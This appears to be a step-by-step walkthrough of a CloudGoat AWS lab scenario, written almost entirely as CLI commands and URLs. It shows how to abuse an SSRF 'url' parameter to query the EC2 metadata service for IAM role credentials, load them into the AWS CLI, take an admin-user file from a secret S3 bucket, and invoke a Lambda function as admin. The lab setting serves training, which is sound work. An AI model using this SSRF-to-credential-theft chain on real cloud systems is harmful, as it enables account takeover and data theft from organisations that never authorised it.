`aws configure --profile solus`

`aws lambda list-functions --profile solus`

`aws configure --profile cglambda`

`aws ec2 describe-instances --profile cglambda`

Go to `http://<EC2 instance IP>`

Abuse the SSRF via the "url" parameter to hit the EC2 instance metadata by going to:

`http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`

And then:

`http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name>`

Then Add the EC2 instance credentials to your AWS CLI credentials file at `~/.aws/credentials`) as shown below:

```
[ec2role]
aws_access_key_id = asdasdasd
aws_secret_access_key = asdasdsadas
aws_session_token = "asdasdasd"
```

`aws s3 ls --profile cgec2role`

`aws s3 ls --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>`

`aws s3 cp --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>/admin-user.txt ./`

`cat admin-user.txt`

`aws configure --profile cgadmin`

`aws lambda list-functions --profile cgadmin`

`aws lambda invoke --function-name cg-lambda-<cloudgoat_id> ./out.txt`

`cat out.txt`